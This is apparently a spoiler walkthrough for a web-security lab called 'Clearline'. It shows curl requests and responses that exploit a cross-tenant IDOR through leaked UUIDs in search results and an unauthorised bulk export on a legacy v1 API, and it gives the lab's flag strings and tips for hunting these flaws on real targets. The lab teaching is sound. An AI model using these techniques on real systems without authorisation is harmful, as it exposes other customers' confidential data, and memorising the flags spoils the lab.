# Solution — Clearline

Full spoilers.

Log in first and keep the session cookie. Everything below assumes you
have it:

```bash
curl -s -c jar -X POST http://localhost:8081/login \
  -d 'email=dana@northwind.example&password=Northwind!24'
```

## Objective 1 — `HxBugLabs{unguess4bl3_1ds_4r3_n0t_4cc3ss_c0ntr0l}`

### Finding it

The contracts page has a search box. Type something generic — `a`,
`agreement`, `term` — and the UI shows only Northwind contracts, which is
what you would expect from a multi-tenant product.

Look at the request instead of the page:

```bash
curl -s -b jar 'http://localhost:8081/api/v2/search?q=term' | python3 -m json.tool
```

```json
{
  "query": "term",
  "count": 2,
  "results": [
    { "id": "1a5b8c30-7e46-4d29-9f81-3b7c2e5a0d64",
      "title": "Meridian — Project Kestrel term sheet",
      "counterparty": "Kestrel Bioscience",
      "status": "confidential",
      "workspaceId": "a71d4c88-2e55-4b0e-9f27-c4d6f81a3e02" },
    ...
  ]
}
```

The server searched every workspace. The filter that made the page look
correct is in `views/documents.ejs`, running in your browser:

```js
var mine = data.results.filter(function (r) { return r.workspaceId === WORKSPACE_ID; });
```

That is the leak. You now hold a UUID you could never have guessed.

### Exploiting it

`GET /api/v2/documents/:id` checks that you are authenticated and stops
there:

```bash
curl -s -b jar http://localhost:8081/api/v2/documents/1a5b8c30-7e46-4d29-9f81-3b7c2e5a0d64 \
  | python3 -m json.tool
```

```
"body": "Series C term sheet, pre-announcement. Pre-money USD 96M, ...
         Deal-room passphrase: HxBugLabs{unguess4bl3_1ds_4r3_n0t_4cc3ss_c0ntr0l}"
```

The HTML route works the same way — open
`http://localhost:8081/documents/1a5b8c30-7e46-4d29-9f81-3b7c2e5a0d64`
in the browser and the contract renders with Meridian's workspace name in
the header bar.

### Root cause

Two bugs that are individually survivable and lethal together:

1. **Authorization implemented on the client.** The search resolver never
   scopes to the caller's workspace, because "the admin console needs the
   unscoped version". One endpoint serving two trust levels, with the
   trust decision made after the data has already left the server.
2. **No ownership check on read.** `documents/:id` authenticates but does
   not authorize. UUIDs are treated as capabilities — unguessable,
   therefore safe — which holds right up until one is disclosed. And
   identifiers leak constantly: search results, notification emails,
   webhook payloads, CSV exports, `Referer` headers, support screenshots.

The lesson to carry into real targets: **when IDs are UUIDs, do not
conclude "no IDOR here" — go find where the application hands you
someone else's ID.** Exports, activity feeds, autocomplete endpoints,
`@mention` lookups and search are the usual suppliers.

## Objective 2 — `HxBugLabs{sh4d0w_4p1_v1_n3v3r_g0t_th3_f1x}`

### Finding it

Look at v2's response *headers*, not its bodies:

```bash
curl -si -b jar 'http://localhost:8081/api/v2/search?q=term' | head -12
```

```
Deprecation: false
Sunset: Tue, 30 Jun 2026 23:59:59 GMT
Link: </api/v1>; rel="predecessor-version"; title="retired 2024-11, mobile clients only"
```

RFC 8594 (`Sunset`) and the `Deprecation` header exist to make lifecycle
machine-readable. Here they announce that a previous version is still
routed. The `Link` relation even names the path.

Enumerate what v1 still answers:

```bash
curl -s -b jar http://localhost:8081/api/v1/workspaces | python3 -m json.tool
```

```json
{ "apiVersion": "1.4.2",
  "workspaces": [ {"slug":"northwind"}, {"slug":"meridian"}, {"slug":"halberd"} ] }
```

### Exploiting it

v1 takes a workspace in the path and exports it whole:

```bash
curl -s -b jar http://localhost:8081/api/v1/workspaces/meridian/export | python3 -m json.tool
```

```json
{
  "apiVersion": "1.4.2",
  "workspace": { "slug": "meridian", "name": "Meridian Capital" },
  "exportToken": "HxBugLabs{sh4d0w_4p1_v1_n3v3r_g0t_th3_f1x}",
  "documents": [ ...every Meridian contract... ]
}
```

`halberd` works too. Your session is a Northwind member seat throughout.

### Root cause

The v1 routes authenticated with a per-device token issued by a service
that has since been shut down. That token service was where the
"is this user a member of this workspace?" check lived. When session-cookie
auth was retrofitted onto v1 so the old mobile clients would keep working,
the authentication was replaced and the authorization was not.

This is the **shadow API** pattern, and it is one of the highest-value
things to look for on a mature target. The current front end is usually
well-reviewed; the version it replaced is where the controls are missing.
Ways they surface in the wild:

- `Deprecation` / `Sunset` / `Link` headers (this lab)
- Version strings in JS bundles and mobile app decompilations
- `/v1/`, `/api/v1/`, `/legacy/`, `/internal/` next to the documented base
- Old OpenAPI/Swagger JSON still served at a stale path
- Error messages that name an internal service or version

## Notes for the report

Severity is not the same for the two findings, and they should be filed
separately:

- **Objective 1** — cross-tenant read of a single confidential contract.
  High. Prove it with the workspace name rendered in the header of a
  document your account has no relationship with, not just a JSON blob.
- **Objective 2** — unauthenticated-by-role bulk export of an entire
  tenant. Critical. Impact is "any customer can dump every other
  customer's contracts", and the PoC is one request.

Both writeups should state plainly that IDs are UUIDs — a triager who
skims will otherwise assume you brute-forced something and mark it
theoretical. Show where the application gave you the ID.
